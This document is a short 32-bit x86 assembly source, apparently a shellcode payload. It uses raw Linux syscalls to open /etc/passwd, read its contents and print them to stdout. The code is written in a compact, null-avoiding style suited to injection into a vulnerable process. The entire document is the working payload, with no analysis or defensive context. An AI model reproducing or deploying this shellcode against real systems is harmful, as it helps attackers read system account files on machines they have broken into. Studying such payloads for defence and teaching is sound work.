bits 32
%include "include/all.asm"
global _start

_start:
  xor eax, eax
  xor ebx, ebx
  xor ecx, ecx
  xor edx, edx

open:
  mov al, 0x05
  push ecx
  push `d`
  push WORD `sw`
  push `/pas`
  push `/etc`
  mov ebx, esp
  int 0x80

read:
  xchg eax, ebx
  xchg eax, ecx
  mov al, 0x03
  mov dx, 0x0FFF
  inc edx
  int 0x80

write:
  xchg eax, edx
  mov bl, 0x01
  shr eax, 0x0A
  int 0x80

exit:
  xchg eax, ebx
  int 0x80